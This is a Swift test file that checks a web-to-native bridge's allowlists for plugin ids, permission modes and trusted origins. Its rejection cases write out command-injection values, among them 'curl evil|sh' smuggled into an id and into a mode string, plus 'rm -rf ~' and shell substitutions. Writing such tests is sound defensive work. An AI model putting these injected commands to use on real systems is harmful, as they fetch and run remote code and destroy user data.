// Standalone security test for the web→native bridge input allowlists (no XCTest in this repo).
// Replicates the EXACT validation logic from FabulaApp.swift (isSafePluginId / PMODES / isTrustedOrigin)
// and asserts that real RCE payloads are rejected while legitimate values pass. Run:
//   swift app/tests/BridgeSecurityTests.swift   (exits non-zero on any failure)
import Foundation

let PORT = 4096

func isSafePluginId(_ s: String) -> Bool {
    return !s.isEmpty && s.count <= 64 && s.range(of: "^[A-Za-z0-9._-]+$", options: .regularExpression) != nil
}
let PMODES: Set<String> = ["default", "plan", "acceptEdits", "bypass"]
func isTrustedOrigin(_ url: URL) -> Bool {
    return url.scheme?.lowercased() == "http" && url.host == "127.0.0.1" && (url.port ?? 80) == PORT
}

var failures = 0
func check(_ cond: Bool, _ name: String) {
    if cond { print("✓ \(name)") } else { print("✗ \(name)"); failures += 1 }
}

// ── plugin id: legit kebab/underscore ids pass; every shell-breakout is rejected ──
for good in ["reproduce-gate", "change-quiz", "receipt", "self_extend", "tools", "a.b-c_1"] {
    check(isSafePluginId(good), "id ok: \(good)")
}
for evil in [
    "x'$(curl evil|sh)'",          // the audit's exact RCE payload
    "x' ; rm -rf ~ ; '",
    "a`id`",
    "a$(whoami)",
    "a|b", "a;b", "a b", "a\nb", "a&b", "a>b",
    "", String(repeating: "a", count: 65),  // empty + over-length
] {
    check(!isSafePluginId(evil), "id rejected: \(evil.prefix(24))")
}

// ── pmode: only the 4 enum values; anything else drops ──
for good in ["default", "plan", "acceptEdits", "bypass"] { check(PMODES.contains(good), "mode ok: \(good)") }
for evil in ["bypass'; curl evil|sh; '", "x`id`", "plan ", "BYPASS", "'"] {
    check(!PMODES.contains(evil), "mode rejected: \(evil.prefix(20))")
}

// ── origin lock: only http://127.0.0.1:4096 is trusted ──
check(isTrustedOrigin(URL(string: "http://127.0.0.1:4096/")!), "origin ok: local engine")
check(isTrustedOrigin(URL(string: "http://127.0.0.1:4096/global/health")!), "origin ok: local path")
for evil in [
    "http://evil.com/", "https://127.0.0.1.evil.com/", "http://127.0.0.1:1234/",
    "http://localhost:4096/", "http://127.0.0.1/", "https://127.0.0.1:4096/",
] {
    check(!isTrustedOrigin(URL(string: evil)!), "origin rejected: \(evil)")
}

if failures == 0 { print("\nALL BRIDGE-SECURITY CHECKS PASSED") } else { print("\n\(failures) FAILURES"); exit(1) }
